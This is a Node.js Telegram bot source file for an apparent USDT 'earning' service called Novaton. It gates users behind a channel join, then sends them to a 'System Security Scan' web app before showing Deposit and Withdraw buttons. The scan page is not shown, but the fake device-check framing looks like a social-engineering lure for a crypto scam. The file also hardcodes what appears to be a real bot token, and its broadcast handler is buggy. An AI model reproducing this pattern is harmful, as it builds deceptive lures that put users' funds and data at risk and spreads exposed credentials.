const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const path = require('path');

const BOT_TOKEN = '8685057163:AAGT3o3Ad-MAYfrHQmxRkA6Py6pnKPnUzMk';
const ADMIN_ID = 1683002116;
const CHANNEL_ID = '@VaultoUSDT';
const bot = new Telegraf(BOT_TOKEN);
const app = express();

let users = new Set(); // لتخزين عدد الأعضاء مؤقتاً

app.use(express.static(path.join(__dirname)));
app.get('/validate', (req, res) => res.sendFile(path.join(__dirname, 'validate.html')));
app.listen(process.env.PORT || 10000);

// دالة التحقق من الاشتراك
async function checkSub(ctx) {
    try {
        const res = await ctx.telegram.getChatMember(CHANNEL_ID, ctx.from.id);
        return ['member', 'administrator', 'creator'].includes(res.status);
    } catch (e) { return false; }
}

bot.start(async (ctx) => {
    const isSub = await checkSub(ctx);
    users.add(ctx.from.id);

    if (!isSub) {
        return ctx.replyWithPhoto("https://image2url.com/r2/default/images/1774806219411-7438bf59-86d5-4352-9d9a-dd254c3f841d.jpg", {
            caption: `⚠️ **Access Denied**\n\nPlease join our official channel to verify your account and start earning.`,
            ...Markup.inlineKeyboard([
                [Markup.button.url("📢 Join Channel", "https://t.me/VaultoUSDT")],
                [Markup.button.callback("✅ Verify Subscription", "verify_now")]
            ])
        });
    }
    showSecurityButton(ctx);
});

bot.action('verify_now', async (ctx) => {
    if (await checkSub(ctx)) {
        await ctx.answerCbQuery("Success!");
        await ctx.deleteMessage();
        showSecurityButton(ctx);
    } else {
        await ctx.answerCbQuery("❌ You haven't joined yet!", { show_alert: true });
    }
});

function showSecurityButton(ctx) {
    const domain = process.env.RENDER_EXTERNAL_HOSTNAME || 'novaton-bot.onrender.com';
    const webAppUrl = `https://${domain}/validate`;

    ctx.reply(`🛡️ **System Security Scan**\n\nPlease complete the device security check to access your dashboard.`, 
    Markup.inlineKeyboard([
        [Markup.button.webApp("🔍 Start Security Scan", webAppUrl)]
    ]));
}

// حل مشكلة ظهور الأزرار بعد الـ Web App
bot.on('web_app_data', (ctx) => {
    ctx.reply("✅ **Verification Complete!**\nWelcome to Novaton Official Bot.", 
    Markup.keyboard([
        ["👤 My Account", "🔗 Referral"],
        ["📥 Deposit", "📤 Withdraw"]
    ]).resize());
});

// --- 👑 لوحة الإدارة (Admin Panel) ---
bot.command('admin', (ctx) => {
    if (ctx.from.id !== ADMIN_ID) return;

    ctx.reply(`👑 **Admin Dashboard**\n\nUsers: ${users.size}\nStatus: Active`, 
    Markup.inlineKeyboard([
        [Markup.button.callback("📢 Broadcast", "admin_cast"), Markup.button.callback("🚫 Ban User", "admin_ban")],
        [Markup.button.callback("⚙️ Settings", "admin_set")]
    ]));
});

// الإذاعة
bot.action('admin_cast', (ctx) => {
    ctx.reply("Send the message you want to broadcast to all users:");
    bot.on('text', (msg) => {
        if (msg.from.id !== ADMIN_ID) return;
        users.forEach(id => bot.telegram.sendMessage(id, msg.message.text).catch(() => {}));
        msg.reply("✅ Broadcast sent!");
    });
});

bot.launch();
